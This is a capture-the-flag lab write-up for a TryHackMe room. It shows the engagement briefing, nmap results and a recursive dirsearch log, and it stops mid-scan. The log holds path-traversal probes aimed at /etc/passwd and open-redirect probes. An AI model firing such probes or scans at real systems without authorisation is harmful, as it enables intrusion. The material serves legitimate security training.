Task 1 - Pre-engagement Briefing
-------------------------------------------------------

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

**Scope of Work**

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

-   User.txt
-   Root.txt  
    

Additionally, the client has provided the following scope allowances:

-   Ensure that you modify your hosts file to reflect internal.thm
-   Any tools or techniques are permitted in this engagement
-   Locate and note all vulnerabilities found
-   Submit the flags discovered to the dashboard
-   Only the IP address assigned to your machine is in scope


Task 2 - Deploy and Engage the Client Environment
------------------------------------------------------------

Ok, I decided to try another scanner. I checked out this Threader3000 from TheMayor after I watched his walkthrough last night. I wanted to hear what he had to say about the Relavant room since he made it. I noticed he wasn't primarily using nmap and I like his approach of scanning, and then calling nmap for what is really needed. I feel like I can learn a lot from this guy. Anyway.. I can tell right away that today's room is also written by him since the wording is the same in the Pre-engagement briefing.

As an aside. You can learn a lot from people just minding their mannerisms and how they type. I spent years on IRC and have gotten quite adept at remembering people solely based on how they type. It is VERY possible and easy to id someone based on this. Remember that when you are making blog posts etc.

```

┌──(kali㉿kali)-[~/pentesting/tryhackme.com/internal/10.10.45.58]
└─$ cat 10.10.45.58.gnmap
# Nmap 7.93 scan initiated Tue Oct 25 08:14:35 2022 as: nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.45.58 10.10.45.58
Host: 10.10.45.58 (internal.thm)        Status: Up
Host: 10.10.45.58 (internal.thm)        Ports: 22/open/tcp//ssh//OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)/, 80/open/tcp//http//Apache httpd 2.4.29 ((Ubuntu))/
# Nmap done at Tue Oct 25 08:14:52 2022 -- 1 IP address (1 host up) scanned in 16.82 seconds
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/internal/10.10.45.58]
└─$ cat 10.10.45.58.nmap 
# Nmap 7.93 scan initiated Tue Oct 25 08:14:35 2022 as: nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.45.58 10.10.45.58
Nmap scan report for internal.thm (10.10.45.58)
Host is up (0.28s latency).

and the nmap

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 25 08:14:52 2022 -- 1 IP address (1 host up) scanned in 16.82 seconds


```


I also noticed he used dirsearch. I typically use gobuster, but I really like how dirsearch enumerates other directories that it finds. It is a LOT of output though. It does look great with the colors though ;)

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u 10.10.45.58 -e -x 400,500 -r -t 100

  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                                              
 (_||| _) (/_(_|| (_| )                                                                                                             
                                                                                                                                    
Extensions: -x | HTTP method: GET | Threads: 100 | Wordlist size: 9481

Output File: /home/kali/reports/_10.10.45.58/_22-10-25_08-21-56.txt

Target: http://10.10.45.58/

[08:21:56] Starting:                                                                                                                
[08:22:01] 403 -  276B  - /.ht_wsr.txt                                      
[08:22:01] 403 -  276B  - /.htaccess.bak1                                   
[08:22:01] 403 -  276B  - /.htaccess.save                                   
[08:22:01] 403 -  276B  - /.htaccess.orig                                   
[08:22:01] 403 -  276B  - /.htaccess.sample
[08:22:01] 403 -  276B  - /.htaccess_orig                                   
[08:22:01] 403 -  276B  - /.htaccess_extra                                  
[08:22:01] 403 -  276B  - /.htaccess_sc
[08:22:01] 403 -  276B  - /.htaccessOLD2
[08:22:01] 403 -  276B  - /.htaccessOLD
[08:22:01] 403 -  276B  - /.htaccessBAK
[08:22:01] 403 -  276B  - /.htm                                             
[08:22:01] 403 -  276B  - /.html
[08:22:01] 403 -  276B  - /.htpasswd_test                                   
[08:22:01] 403 -  276B  - /.httr-oauth                                      
[08:22:01] 403 -  276B  - /.htpasswds                                       
[08:22:02] 403 -  276B  - /.php                                             
[08:22:10] 200 -    2KB - /blog/wp-login.php                                
[08:22:10] 301 -  309B  - /blog  ->  http://10.10.45.58/blog/               
Added to the queue: blog/
[08:22:11] 200 -   18KB - /blog/                                            
[08:22:18] 301 -  315B  - /javascript  ->  http://10.10.45.58/javascript/   
Added to the queue: javascript/
[08:22:25] 301 -  315B  - /phpmyadmin  ->  http://10.10.45.58/phpmyadmin/   
Added to the queue: phpmyadmin/
[08:22:26] 200 -    3KB - /phpmyadmin/index.php                             
[08:22:26] 200 -    3KB - /phpmyadmin/                                      
[08:22:26] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[08:22:29] 403 -  276B  - /server-status                                    
[08:22:29] 403 -  276B  - /server-status/                                   
Added to the queue: server-status/
[08:22:37] 200 -    2KB - /wordpress/wp-login.php                           
[08:22:37] 404 -   51KB - /wordpress/                                       
                                                                             
[08:22:39] Starting: blog/                                                                                                          
[08:22:43] 403 -  276B  - /blog/.ht_wsr.txt                                 
[08:22:43] 403 -  276B  - /blog/.htaccess.orig                              
[08:22:43] 403 -  276B  - /blog/.htaccess.bak1                              
[08:22:43] 403 -  276B  - /blog/.htaccess.sample
[08:22:43] 403 -  276B  - /blog/.htaccess.save
[08:22:43] 403 -  276B  - /blog/.htaccess_orig
[08:22:43] 403 -  276B  - /blog/.htaccessOLD2                               
[08:22:43] 403 -  276B  - /blog/.htaccess_sc                                
[08:22:43] 403 -  276B  - /blog/.htaccessOLD                                
[08:22:43] 403 -  276B  - /blog/.htm                                        
[08:22:43] 403 -  276B  - /blog/.htaccessBAK
[08:22:43] 403 -  276B  - /blog/.httr-oauth                                 
[08:22:43] 403 -  276B  - /blog/.htpasswd_test                              
[08:22:43] 403 -  276B  - /blog/.htpasswds
[08:22:43] 403 -  276B  - /blog/.htaccess_extra                             
[08:22:43] 403 -  276B  - /blog/.html                                       
[08:22:44] 403 -  276B  - /blog/.php                                        
[08:23:01] 301 -    0B  - /blog/index.php  ->  http://10.10.45.58/blog/     
[08:23:02] 404 -   51KB - /blog/index.php/login/                            
[08:23:03] 200 -    7KB - /blog/license.txt                                 
[08:23:11] 200 -    3KB - /blog/readme.html                                 
[08:23:21] 301 -  318B  - /blog/wp-admin  ->  http://10.10.45.58/blog/wp-admin/
Added to the queue: blog/wp-admin/
[08:23:21] 302 -    0B  - /blog/wp-admin/  ->  http://internal.thm/blog/wp-login.php?redirect_to=http%3A%2F%2F10.10.45.58%2Fblog%2Fwp-admin%2F&reauth=1
[08:23:21] 400 -    1B  - /blog/wp-admin/admin-ajax.php                     
[08:23:21] 500 -    3KB - /blog/wp-admin/setup-config.php                   
[08:23:21] 200 -  550B  - /blog/wp-admin/install.php
[08:23:21] 301 -  320B  - /blog/wp-content  ->  http://10.10.45.58/blog/wp-content/
Added to the queue: blog/wp-content/
[08:23:21] 500 -  609B  - /blog/wp-content/plugins/akismet/akismet.php
[08:23:21] 500 -    0B  - /blog/wp-content/plugins/hello.php                
[08:23:21] 500 -  609B  - /blog/wp-content/plugins/akismet/admin.php        
[08:23:21] 200 -    0B  - /blog/wp-content/                                 
[08:23:21] 200 -    0B  - /blog/wp-config.php                               
[08:23:21] 200 -    0B  - /blog/wp-cron.php                                 
[08:23:21] 403 -  276B  - /blog/wp-includes/                                
Added to the queue: blog/wp-includes/
[08:23:21] 500 -    0B  - /blog/wp-includes/rss-functions.php               
[08:23:21] 301 -  321B  - /blog/wp-includes  ->  http://10.10.45.58/blog/wp-includes/
[08:23:21] 302 -    0B  - /blog/wp-signup.php  ->  http://internal.thm/blog/wp-login.php?action=register
[08:23:21] 405 -   42B  - /blog/xmlrpc.php                                  
                                                                             
[08:23:22] Starting: javascript/                                                                                                    
                                                                             
[08:24:05] Starting: phpmyadmin/                                                                                                    
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccess.orig                        
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccess.sample
[08:24:09] 403 -  276B  - /phpmyadmin/.ht_wsr.txt                           
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccess.bak1                        
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccess.save                        
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccessOLD2                         
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccessOLD                          
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccess_orig                        
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccess_sc                          
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccessBAK
[08:24:09] 403 -  276B  - /phpmyadmin/.htpasswd_test                        
[08:24:09] 403 -  276B  - /phpmyadmin/.htm                                  
[08:24:09] 403 -  276B  - /phpmyadmin/.htaccess_extra
[08:24:09] 403 -  276B  - /phpmyadmin/.htpasswds
[08:24:09] 403 -  276B  - /phpmyadmin/.httr-oauth                           
[08:24:09] 403 -  276B  - /phpmyadmin/.html                                 
[08:24:10] 403 -  276B  - /phpmyadmin/.php                                  
[08:24:23] 301 -  319B  - /phpmyadmin/doc  ->  http://10.10.45.58/phpmyadmin/doc/
Added to the queue: phpmyadmin/doc/
[08:24:23] 403 -  276B  - /phpmyadmin/doc/
[08:24:25] 200 -   22KB - /phpmyadmin/favicon.ico                           
[08:24:27] 200 -    3KB - /phpmyadmin/import.php                            
[08:24:28] 403 -  276B  - /phpmyadmin/js/                                   
Added to the queue: phpmyadmin/js/
[08:24:28] 301 -  318B  - /phpmyadmin/js  ->  http://10.10.45.58/phpmyadmin/js/
[08:24:29] 403 -  276B  - /phpmyadmin/libraries/tiny_mce                    
[08:24:29] 200 -    6KB - /phpmyadmin/js/config.js                          
[08:24:29] 403 -  276B  - /phpmyadmin/libraries/tiny_mce/                   
Added to the queue: phpmyadmin/libraries/tiny_mce/
[08:24:29] 403 -  276B  - /phpmyadmin/libraries                             
[08:24:29] 403 -  276B  - /phpmyadmin/libraries/tinymce/                    
Added to the queue: phpmyadmin/libraries/tinymce/
[08:24:29] 403 -  276B  - /phpmyadmin/libraries/phpmailer/                  
Added to the queue: phpmyadmin/libraries/phpmailer/
[08:24:29] 403 -  276B  - /phpmyadmin/libraries/                            
Added to the queue: phpmyadmin/libraries/
[08:24:29] 200 -    3KB - /phpmyadmin/license.php
[08:24:29] 403 -  276B  - /phpmyadmin/libraries/tinymce                     
[08:24:34] 200 -    3KB - /phpmyadmin/phpinfo.php                           
[08:24:39] 401 -  458B  - /phpmyadmin/setup/                                
Added to the queue: phpmyadmin/setup/
[08:24:39] 401 -  458B  - /phpmyadmin/setup                                 
[08:24:40] 301 -  319B  - /phpmyadmin/sql  ->  http://10.10.45.58/phpmyadmin/sql/
Added to the queue: phpmyadmin/sql/
[08:24:40] 200 -    3KB - /phpmyadmin/sql.php                               
[08:24:40] 403 -  276B  - /phpmyadmin/sql/                                  
[08:24:43] 403 -  276B  - /phpmyadmin/templates                             
[08:24:43] 403 -  276B  - /phpmyadmin/templates/system/                     
Added to the queue: phpmyadmin/templates/system/
[08:24:43] 403 -  276B  - /phpmyadmin/templates/                            
Added to the queue: phpmyadmin/templates/
[08:24:43] 403 -  276B  - /phpmyadmin/templates/ja-helio-farsi/index.php    
[08:24:43] 403 -  276B  - /phpmyadmin/templates/protostar/                  
Added to the queue: phpmyadmin/templates/protostar/
[08:24:43] 403 -  276B  - /phpmyadmin/templates/beez/index.php              
[08:24:43] 403 -  276B  - /phpmyadmin/templates/beez3/                      
Added to the queue: phpmyadmin/templates/beez3/
[08:24:43] 403 -  276B  - /phpmyadmin/templates/index.html
[08:24:43] 403 -  276B  - /phpmyadmin/themes/                               
Added to the queue: phpmyadmin/themes/
[08:24:43] 403 -  276B  - /phpmyadmin/templates/rhuk_milkyway/index.php     
[08:24:43] 301 -  322B  - /phpmyadmin/themes  ->  http://10.10.45.58/phpmyadmin/themes/
                                                                             
[08:24:49] Starting: server-status/                                                                                                 
[08:24:52] 404 -  273B  - /server-status/%2e%2e//google.com                 
                                                                             
[08:25:33] Starting: blog/wp-admin/                                                                                                 
[08:25:37] 403 -  276B  - /blog/wp-admin/.ht_wsr.txt                        
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccess.bak1                     
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccess.orig
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccess.save                     
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccess_extra                    
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccess.sample                   
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccessBAK
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccess_orig
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccess_sc
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccessOLD
[08:25:37] 403 -  276B  - /blog/wp-admin/.htaccessOLD2
[08:25:37] 403 -  276B  - /blog/wp-admin/.html                              
[08:25:37] 403 -  276B  - /blog/wp-admin/.httr-oauth                        
[08:25:37] 403 -  276B  - /blog/wp-admin/.htpasswds
[08:25:37] 403 -  276B  - /blog/wp-admin/.htpasswd_test
[08:25:38] 403 -  276B  - /blog/wp-admin/.htm                               
[08:25:38] 403 -  276B  - /blog/wp-admin/.php                               
[08:25:50] 301 -  322B  - /blog/wp-admin/css  ->  http://10.10.45.58/blog/wp-admin/css/
Added to the queue: blog/wp-admin/css/
[08:25:54] 301 -  325B  - /blog/wp-admin/images  ->  http://10.10.45.58/blog/wp-admin/images/
Added to the queue: blog/wp-admin/images/
[08:25:54] 403 -  276B  - /blog/wp-admin/images/                            
[08:25:55] 301 -  327B  - /blog/wp-admin/includes  ->  http://10.10.45.58/blog/wp-admin/includes/
Added to the queue: blog/wp-admin/includes/
[08:25:55] 403 -  276B  - /blog/wp-admin/includes/                          
[08:25:55] 200 -  550B  - /blog/wp-admin/install.php?profile=default        
[08:25:56] 301 -  321B  - /blog/wp-admin/js  ->  http://10.10.45.58/blog/wp-admin/js/
Added to the queue: blog/wp-admin/js/
[08:25:56] 403 -  276B  - /blog/wp-admin/js/
[08:25:57] 403 -  276B  - /blog/wp-admin/maint/                             
Added to the queue: blog/wp-admin/maint/
[08:25:59] 301 -  326B  - /blog/wp-admin/network  ->  http://10.10.45.58/blog/wp-admin/network/
Added to the queue: blog/wp-admin/network/
[08:26:10] 301 -  323B  - /blog/wp-admin/user  ->  http://10.10.45.58/blog/wp-admin/user/
Added to the queue: blog/wp-admin/user/
[08:26:10] 200 -  550B  - /blog/wp-admin/upgrade.php                        
                                                                             
[08:26:15] Starting: blog/wp-content/                                                                                               
[08:26:19] 403 -  276B  - /blog/wp-content/.ht_wsr.txt                      
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccess.orig                   
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccess.sample                 
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccess.save
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccess.bak1
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccess_extra                  
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccess_orig
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccessBAK
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccess_sc
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccessOLD
[08:26:19] 403 -  276B  - /blog/wp-content/.html                            
[08:26:19] 403 -  276B  - /blog/wp-content/.htaccessOLD2                    
[08:26:19] 403 -  276B  - /blog/wp-content/.htpasswds
[08:26:19] 403 -  276B  - /blog/wp-content/.httr-oauth
[08:26:19] 403 -  276B  - /blog/wp-content/.htpasswd_test
[08:26:19] 403 -  276B  - /blog/wp-content/.htm                             
[08:26:20] 403 -  276B  - /blog/wp-content/.php                             
[08:26:44] 301 -  328B  - /blog/wp-content/plugins  ->  http://10.10.45.58/blog/wp-content/plugins/
Added to the queue: blog/wp-content/plugins/
[08:26:52] 301 -  327B  - /blog/wp-content/themes  ->  http://10.10.45.58/blog/wp-content/themes/
Added to the queue: blog/wp-content/themes/
                                                                             
[08:26:57] Starting: blog/wp-includes/                                                                                              
[08:27:10] 301 -  328B  - /blog/wp-includes/assets  ->  http://10.10.45.58/blog/wp-includes/assets/
Added to the queue: blog/wp-includes/assets/
[08:27:11] 301 -  328B  - /blog/wp-includes/blocks  ->  http://10.10.45.58/blog/wp-includes/blocks/
Added to the queue: blog/wp-includes/blocks/
[08:27:13] 200 -    0B  - /blog/wp-includes/cron.php                        
[08:27:14] 301 -  325B  - /blog/wp-includes/css  ->  http://10.10.45.58/blog/wp-includes/css/
Added to the queue: blog/wp-includes/css/
[08:27:17] 301 -  327B  - /blog/wp-includes/fonts  ->  http://10.10.45.58/blog/wp-includes/fonts/
Added to the queue: blog/wp-includes/fonts/
[08:27:18] 301 -  328B  - /blog/wp-includes/images  ->  http://10.10.45.58/blog/wp-includes/images/
Added to the queue: blog/wp-includes/images/
[08:27:20] 301 -  324B  - /blog/wp-includes/js  ->  http://10.10.45.58/blog/wp-includes/js/
Added to the queue: blog/wp-includes/js/
[08:27:20] 301 -  332B  - /blog/wp-includes/js/tinymce  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/
Added to the queue: blog/wp-includes/js/tinymce/                            
[08:27:20] 200 -    0B  - /blog/wp-includes/load.php                        
[08:27:34] 500 -    0B  - /blog/wp-includes/update.php                      
[08:27:35] 200 -    0B  - /blog/wp-includes/user.php                        
                                                                             
[08:27:39] Starting: phpmyadmin/doc/                                                                                                
[08:28:00] 301 -  324B  - /phpmyadmin/doc/html  ->  http://10.10.45.58/phpmyadmin/doc/html/
Added to the queue: phpmyadmin/doc/html/                                    
                                                                             
[08:28:22] Starting: phpmyadmin/js/                                                                                                 
                                                                              
[08:29:03] Starting: phpmyadmin/libraries/tiny_mce/                                                                                 
[08:29:17] 404 -  273B  - /phpmyadmin/libraries/tiny_mce/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:29:44] Starting: phpmyadmin/libraries/tinymce/                                                                                  
[08:29:58] 404 -  273B  - /phpmyadmin/libraries/tinymce/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:30:25] Starting: phpmyadmin/libraries/phpmailer/                                                                                
[08:30:39] 404 -  273B  - /phpmyadmin/libraries/phpmailer/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:31:06] Starting: phpmyadmin/libraries/                                                                                          
[08:31:08] 404 -  273B  - /phpmyadmin/libraries/%2e%2e//google.com           
                                                                              
[08:31:47] Starting: phpmyadmin/setup/                                                                                              
[08:31:49] 404 -  273B  - /phpmyadmin/setup/%2e%2e//google.com               
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccess.bak1                   
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.ht_wsr.txt                      
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccess.orig                   
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccess.sample                 
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccess_orig                   
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccess_extra                  
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccessBAK
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccess_sc
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccess.save
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccessOLD2
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htaccessOLD
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htm                             
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.html                            
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htpasswd_test                   
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.htpasswds
[08:31:51] 403 -  276B  - /phpmyadmin/setup/.httr-oauth                      
[08:31:52] 403 -  276B  - /phpmyadmin/setup/.php                             
[08:32:09] 403 -  276B  - /phpmyadmin/setup/lib                              
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/uploader/.actionScriptProperties
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/varien/.flexLibProperties
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/fckeditor                    
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/varien/.settings        
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/fckeditor/                   
Added to the queue: phpmyadmin/setup/lib/fckeditor/
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/tiny_mce
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/tinymce                      
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/uploader/.settings      
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/phpunit/Util/PHP/eval-stdin.php
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/tiny_mce/                    
Added to the queue: phpmyadmin/setup/lib/tiny_mce/
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/varien/.actionScriptProperties
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/bundler/man/
Added to the queue: phpmyadmin/setup/lib/bundler/man/
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/phpunit/src/Util/PHP/eval-stdin.php
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/uploader/.project       
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/phpunit/phpunit/phpunit      
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/tinymce/                     
Added to the queue: phpmyadmin/setup/lib/tinymce/
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/                             
Added to the queue: phpmyadmin/setup/lib/
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/varien/.project         
[08:32:10] 403 -  276B  - /phpmyadmin/setup/lib/flex/uploader/.flexProperties
                                                                              
[08:32:28] Starting: phpmyadmin/sql/                                                                                                
                                                                              
[08:33:12] Starting: phpmyadmin/templates/system/                                                                                   
[08:33:27] 404 -  273B  - /phpmyadmin/templates/system/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:33:55] Starting: phpmyadmin/templates/                                                                                          
[08:33:58] 404 -  273B  - /phpmyadmin/templates/%2e%2e//google.com           
                                                                              
[08:34:37] Starting: phpmyadmin/templates/protostar/                                                                                
[08:34:52] 404 -  273B  - /phpmyadmin/templates/protostar/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:35:20] Starting: phpmyadmin/templates/beez3/                                                                                    
[08:35:34] 404 -  273B  - /phpmyadmin/templates/beez3/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:36:02] Starting: phpmyadmin/themes/                                                                                             
                                                                              
[08:36:43] Starting: blog/wp-admin/css/                                                                                             
                                                                              
[08:37:24] Starting: blog/wp-admin/images/                                                                                          
                                                                              
[08:38:05] Starting: blog/wp-admin/includes/                                                                                        
[08:38:14] 500 -    0B  - /blog/wp-admin/includes/admin.php                  
[08:38:24] 500 -    0B  - /blog/wp-admin/includes/file.php                   
[08:38:26] 200 -    0B  - /blog/wp-admin/includes/import.php                 
[08:38:30] 200 -    0B  - /blog/wp-admin/includes/misc.php                   
[08:38:42] 200 -    0B  - /blog/wp-admin/includes/update.php                 
[08:38:42] 500 -    0B  - /blog/wp-admin/includes/upgrade.php                
[08:38:42] 200 -    0B  - /blog/wp-admin/includes/user.php                   
                                                                              
[08:38:47] Starting: blog/wp-admin/js/                                                                                              
                                                                              
[08:39:27] Starting: blog/wp-admin/maint/                                                                                           
                                                                              
[08:40:09] Starting: blog/wp-admin/network/                                                                                         
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.ht_wsr.txt                 
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccess.bak1              
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccess.orig              
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccess.sample            
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccess_extra
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccess.save
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccess_sc
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccessOLD
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccessOLD2               
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htm                        
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccess_orig              
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htaccessBAK
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.html                       
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.httr-oauth                 
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htpasswd_test              
[08:40:13] 403 -  276B  - /blog/wp-admin/network/.htpasswds
[08:40:14] 403 -  276B  - /blog/wp-admin/network/.php                        
                                                                              
[08:40:50] Starting: blog/wp-admin/user/                                                                                            
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.ht_wsr.txt                    
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccess.bak1                 
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccess.save                 
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccessBAK                   
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccess.orig
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccess_extra
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccess_sc
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccess.sample               
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccess_orig
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htm
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccessOLD2
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htaccessOLD
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htpasswds                     
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.htpasswd_test
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.httr-oauth                    
[08:40:54] 403 -  276B  - /blog/wp-admin/user/.html                          
[08:40:55] 403 -  276B  - /blog/wp-admin/user/.php                           
                                                                              
[08:41:31] Starting: blog/wp-content/plugins/                                                                                       
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.ht_wsr.txt               
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccess.bak1
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccess.save            
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccess.sample          
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccess.orig
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccess_extra
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccess_orig
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccessBAK              
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccess_sc
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htm
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.html                     
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccessOLD2
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htpasswd_test            
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.httr-oauth               
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htpasswds
[08:41:35] 403 -  276B  - /blog/wp-content/plugins/.htaccessOLD              
[08:41:36] 403 -  276B  - /blog/wp-content/plugins/.php                      
                                                                              
[08:42:12] Starting: blog/wp-content/themes/                                                                                        
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.ht_wsr.txt                
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccess.bak1             
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccess.sample           
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccess.save
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccess_orig
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccess_sc               
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccess_extra
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccess.orig
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccessOLD               
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.html                      
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccessOLD2              
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htpasswd_test             
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.httr-oauth
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htaccessBAK
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htpasswds                 
[08:42:16] 403 -  276B  - /blog/wp-content/themes/.htm                       
[08:42:17] 403 -  276B  - /blog/wp-content/themes/.php                       
                                                                              
[08:42:53] Starting: blog/wp-includes/assets/                                                                                       
